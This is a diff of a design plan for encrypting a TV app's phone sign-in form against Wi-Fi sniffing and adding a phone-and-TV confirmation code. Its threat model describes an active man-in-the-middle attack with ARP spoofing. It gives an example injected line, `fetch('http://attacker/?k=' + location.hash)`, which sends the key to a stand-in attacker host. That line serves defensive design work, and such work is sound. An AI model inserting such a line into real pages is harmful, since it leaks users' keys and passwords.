@@ -1,8 +1,9 @@
 # Encrypted phone sign-in: plan
 
-Plan for the `TODO.md` item "Encrypt the phone form against passive Wi-Fi sniffing", plus a
-confirmation code that the phone and TV must both show. Covers `src/pairing.rs`,
-`src/pairing.html`, `src/signin.html`, `src/api.rs` and `frontend/src/ProfileGate.tsx`.
+Design for encrypting the phone form against passive Wi-Fi sniffing, plus a confirmation code that
+the phone and TV must both show. **Implemented 2026-10-21**; the manual tests at the end are still
+open (see `TODO.md`). Covers `src/pairing.rs`, `src/pairing.html`, `src/api.rs` and
+`frontend/src/ProfileGate.tsx`.
 
 ## Threat model
 
@@ -17,25 +18,16 @@ code that the network delivered. Only HTTPS with a trusted certificate or a nati
 fix it, and both are out of scope. The README and `plan.md` keep saying "trusted network only".
 
 ### How the active attack works
-1. **They get in the middle.** The attacker, on the same network, uses ARP spoofing (for example
-   `bettercap`), a rogue access point or a hacked router, so traffic to `:7879` goes through them.
-2. **The phone loads the page.** It asks for `GET /p/<token>`. The key isn't in the request,
-   because browsers never send the `#fragment`.
-3. **They change the page.** They pass the request to the real TV and add one line to the page
-   before passing it on, for example `fetch('http://attacker/?k=' + location.hash)`.
-4. **The phone runs their version.** It runs in the page that the `#key` URL opened, so it reads
-   the key exactly as the real script does.
-5. **Everything else works normally.** They pass every request through and decrypt it as it goes
-   by, or their script sends what's typed straight to them. The TV makes the confirmation code and
-   the phone decrypts it, so the codes match and every backend check passes. The attacker never
-   needs to see the TV, and nothing looks wrong on either screen.
+The attacker sits in the middle (ARP spoofing, rogue access point or hacked router), forwards
+`GET /p/<token>` to the TV and adds one line to the returned page, such as
+`fetch('http://attacker/?k=' + location.hash)`. The phone runs that page, so it reads the key like
+the real script does, and the attacker decrypts everything as it passes. The confirmation code
+matches and every backend check passes, so nothing looks wrong on either screen.
 
-**What they need:** to be on the network (they know the Wi-Fi password or control the router)
-and to act during the few minutes a sign-in is open, since port 7879 is closed the rest of the
-time. 2-step codes work once and Google uses them right away, which limits the damage, but the
-password still leaks. For a home network with people you trust, the risk is small. On shared or
-public Wi-Fi it's real, so the phone page and the README say: **"On shared Wi-Fi, use the TV
-keyboard instead."**
+**What they need:** to be on the network and to act during the few minutes a sign-in is open
+(port 7879 is closed otherwise). 2-step codes work once, which limits the damage, but the password
+still leaks. At home with people you trust the risk is small. On shared or public Wi-Fi it's real,
+so the phone page and the README say: **"On shared Wi-Fi, use the TV keyboard instead."**
 
 **What would stop it, if it's ever needed:**
 | Option | Notes |
@@ -45,7 +37,7 @@ keyboard instead."**
 | TV keyboard | Nothing crosses the network. Always available as the fallback |
 
 ### Why the TV side isn't encrypted
-- The TV UI and `signin.html` get the code and URL from the main API over `127.0.0.1` only (the
+- The TV UI gets the code and URL from the main API over `127.0.0.1` only (the
   server binds to localhost and checks `Host`). Those packets never reach the Wi-Fi.
 - The screen has to be readable. That only people in the room can see it is what makes the code
   and the `#key` URL safe to show.
@@ -56,7 +48,7 @@ keyboard instead."**
 ## How it works
 
 ```
-TV (CouchTube UI / signin.html)             Phone browser                     Backend :7879
+TV (CouchTube login page)                  Phone browser                     Backend :7879
   QR = http://<ip>:7879/p/<token>#<key>
                                      ──scan──▶ GET /p/<token>      (no key: browsers never send the #fragment)
                                                read key, then strip it from the address bar
@@ -129,11 +121,9 @@ encrypted.
 - **`ProfileGate.tsx`**: poll `/api/pairing` (about once a second) while the QR code is shown.
   Once `code` is set and not confirmed, show the code with **Yes, that's my phone** and **No**
   buttons (`data-nav`, so the arrow keys and Enter work). Once confirmed, show "Phone connected".
-- **`signin.html`**: the same prompt and buttons, because users may scan from the Firefox start
-  page. The requests go to the same localhost API it already reads.
-- After Firefox moves on to Google, the TV can't show the prompt. So the phone page says up front:
-  "Confirm the code on the TV before you continue to Google." The normal order is scan, confirm,
-  then continue to Google.
+- Firefox opens on Google as soon as the user presses **Yes**, so the TV can't show the prompt
+  afterwards. The phone page says up front: "Confirm the code on the TV before you continue to
+  Google." The order is scan, confirm, then Google.
 
 ### Phone page (`pairing.html`)
 1. On load, read `location.hash`. If it's missing or not 64 hex characters, show "Scan the QR code
@@ -143,17 +133,6 @@ encrypted.
 3. Keep the forms disabled until the state is `confirmed`, so errors stay rare.
 4. Each submit sends `box({phone, step, seq: ++seq, text})`. Keep `seq` in `sessionStorage` too,
    so a reload doesn't reuse an old number.
-
-## Changes by file
-| File | Change |
-|---|---|
-| `Cargo.toml` | add `crypto_secretbox` |
-| `src/pairing.rs` | `key`, `phone: Option<Phone { id, code, confirmed, last_seq }>` on `Session`; `hello`, `status` routes; decrypt and check before `claim`; `confirm`, `reset`; key in `info()` |
-| `src/vendor/nacl.min.js` | new, vendored tweetnacl 1.0.3 |
-| `src/pairing.html` | fragment handling, hello and code, encrypted steps, "on shared Wi-Fi use the TV keyboard" line |
-| `src/api.rs` | `code` and `confirmed` in `GET /api/pairing`; `POST /api/pairing/confirm` and `/reject` |
-| `src/signin.html`, `frontend/src/ProfileGate.tsx`, `frontend/src/api.ts` | confirmation prompt |
-| `plan.md`, `README.md`, `TODO.md` | describe the encryption and its active-attacker limit, with the shared Wi-Fi advice; tick the TODO |
 
 ## Tests
 - **Rust unit tests** (`pairing.rs`):
